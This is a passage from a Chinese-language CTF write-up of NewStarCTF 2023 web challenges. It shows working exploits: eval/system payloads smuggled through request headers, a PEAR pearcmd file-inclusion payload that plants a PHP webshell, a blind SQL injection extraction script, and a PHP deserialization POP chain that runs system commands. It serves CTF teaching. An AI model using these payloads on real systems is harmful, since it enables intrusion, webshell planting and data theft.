data-num="26"></td><td><pre>------WebKitFormBoundaryIkVx38g5yCKcBpoo--</pre></td></tr></table></figure><p>用蚁剑连接或者直接命令执行即可。</p><h3 id="rce-2"><a class="anchor" href="#rce-2">#</a> R<span class="spoiler" title="你知道得太多了">C</span>E!!</h3><p>进入题目：</p><blockquote><p>Welcome To NewstarCTF 2023,Nothing here,or you wanna to find some leaked information?</p></blockquote><p>提示有信息泄露，用 dirsearch 扫，扫除 /.git，使用 GitHack 工具获取源码，看到里面有个 bo0g1pop.php</p><p>进入界面：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>第一个正则对提交的参数进行处理：任意字符加上可选括号（允许嵌套）更换为空，然后判断是否等于分号，说白了就是限制你只能使用不带参数的函数，也可以说是无参 rce。</p><p>具体可以参考这篇文章：</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcHVyc3VlLXNlY3VyaXR5L3AvMTU0MDYyNzIuaHRtbA==">RCE 篇之无参数 rce</span></p><p>然后看第二个正则，过滤了很多函数，current 函数用来输出数组中当前元素的值，可以用 pos 函数代替</p><p>先如此操作看看</p><p>?star=print_r(getallheaders());</p><p>回显：</p><blockquote><p><code></code> Array ( [Host] =&gt; <span class="exturl" data-url="aHR0cDovLzRjZmNmMGQyLTM0Y2YtNGQ4Ny05NDAxLTJlY2EwZjY2NDI5ZS5ub2RlNC5idXVvai5jbjo4MQ==">4cfcf0d2-34cf-4d87-9401-2eca0f66429e.node4.buuoj.cn:81</span> [User-Agent] =&gt; Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 [Accept] =&gt; text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.7 [Accept-Encoding] =&gt; gzip, deflate [Accept-Language] =&gt; zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 [Upgrade-Insecure-Requests] =&gt; 1 [X-Forwarded-For] =&gt; 42.122.142.35, 101.70.126.158 [X-Forwarded-Proto] =&gt; http )</p></blockquote><p>很明显我们不能直接修改 host 上的值，所以 array_reverse () 一下，在 X-Forwarded-Proto 上操作，或者可以 next 下在 User-Agent 上操作。</p><p>?star=eval(next(getallheaders()));</p><p>User-Agent:system(&quot;ls /&quot;);</p><p>User-Agent:system(&quot;cat /flag&quot;);</p><h2 id="week3"><a class="anchor" href="#week3">#</a> Week3</h2><h3 id="include"><a class="anchor" href="#include">#</a> Include 🍐</h3><p>题目：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        </pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|log|session|filter|input|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        </pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token comment"># Something in phpinfo.php!</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>题目过滤了常见的伪协议，然后提示说在 phpinfo.php 文件中有东西</p><p>?file=phpinfo</p><p>看到一串敏感信息：</p><p check_register_argc_argv="">fake</p><p>然后检查 register_argc_argv 发现都是 on。</p><p>结合标题，pear，搜索发现是 pear 裸文件包含。</p><p>具体可以参考 p 神的文章：</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vZG9ja2VyLXBocC1pbmNsdWRlLWdldHNoZWxsLmh0bWw=">Docker PHP 裸文件本地包含综述</span></p><p>payload:</p><blockquote><p>/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+/tmp/cmd.php</p></blockquote><p>简单解释一下：</p><p>首先得知道 $_SERVER ['argv'] 通过 query_string 取值，并通过 + 作为分割符，</p><p>然后就是 config-create，阅读其代码和帮助，可以知道，它可以直接创建配置文件，这个命令需要传入两个参数，且第一个参数必须以 / 开头，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p><p>这里的：/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval ($_POST ['cmd']);?&gt; 就是第一个参数，由于 php 会将格式错误的代码忽视，所以这句话即起到将 /usr/local/lib/php/pearcmd 包含的作用，又写入了一句话木马文件的内容，</p><p>所以也可以这样写：</p><blockquote><p>?file=/usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST['a'])?&gt;+/tmp/cmd.php</p></blockquote><p>最后：</p><blockquote><p>?file=/tmp/cmd</p><p>#post</p><p>0=system(&quot;cat /flag&quot;);</p></blockquote><p>即可。</p><h3 id="medium_sql"><a class="anchor" href="#medium_sql">#</a> medium_sql</h3><p>相较于 week1 过滤了 union</p><p>不过对咱没啥影响，脚本依旧可以用：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> urllib</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> string</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="8"></td><td><pre>burp0_url <span class="token operator">=</span> <span class="token string">"http://4eee49a9-7a7b-4891-933b-27c782f49044.node4.buuoj.cn:81/"</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token comment">#url = burp0_url + "?id=TMP1589' And Ascii(Substr(database(),&#123;&#125;,1)) = &#123;&#125;%23".format(i, ord(j))</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token comment">#url = burp0_url + "?id=TMP1589' And Ascii(Substr((Select table_name From INFOrmation_schema.tables Where table_schema='ctf' limit 1,1),&#123;&#125;,1))=&#123;&#125;%23".format(i, ord(j))</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token comment">#here_is_flag</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token comment">#url = burp0_url + "?id=TMP1589' And Ascii(Substr((Select column_name From INFOrmation_schema.columns Where table_schema='ctf' And table_name='here_is_flag' limit 0,1),&#123;&#125;,1))=&#123;&#125;%23".format(i, ord(j))</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        url <span class="token operator">=</span> burp0_url <span class="token operator">+</span> <span class="token string">"?id=TMP1589' And Ascii(Substr((Select flag From here_is_flag),&#123;&#125;,1))=&#123;&#125;%23"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">"id: TMP1589"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            flag <span class="token operator">+=</span> j</pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">continue</span></pre></td></tr></table></figure><h3 id="pop-gadget"><a class="anchor" href="#pop-gadget">#</a> POP Gadget</h3><p>题目：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Begin</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome to NewStarCTF 2023!"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Then</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$func</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Good Job!"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Handle</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Super</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span><span class="token operator">-></span><span class="token function">getStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"==GAME OVER=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="50"></td><td><pre></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">-></span><span class="token property">log</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="60"></td><td><pre></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">WhiteGod</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unset</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </pre></td></tr><tr><td data-num="68"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>简单的 pop 链子，从 Begin 的__destruct 析构函数作为起点开始，构造 POP 链触发到 WhiteGod 的__unset 方法，__unset 方法中存在一个函数的动态调用，可以实现 RCE。</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Begin</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Then</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$func</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Handle</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Super</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">protected</span> <span class="token variable">$obj</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Handle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$handle</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WhiteGod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">WhiteGod</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token operator">=</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"cat /flag"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Then</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token variable">$a</span> <span class="token operator">-></span> <span class="token property">name</span><span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token comment">//echo serialize($a);</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>需要注意的是一些类中有保护或私有属性的成员，因此需要对序列化数据进行 URL 编码，得到：</p><blockquote><p>pop=O%3A5%3A%22Begin%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Then%22%3A1%3A%7Bs%3A10%3A%22%00Then%00func%22%3BO%3A5%3A%22Super%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A3%3A%22CTF%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A8%3A%22WhiteGod%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22var%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D%7D%7D%7D%7D</p></blockquote><h3 id="rce-3"><a class="anchor" href="#rce-3">#</a> R!<span class="spoiler" title="你知道得太多了">C</span>!E!!!</h3><p>题目：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token 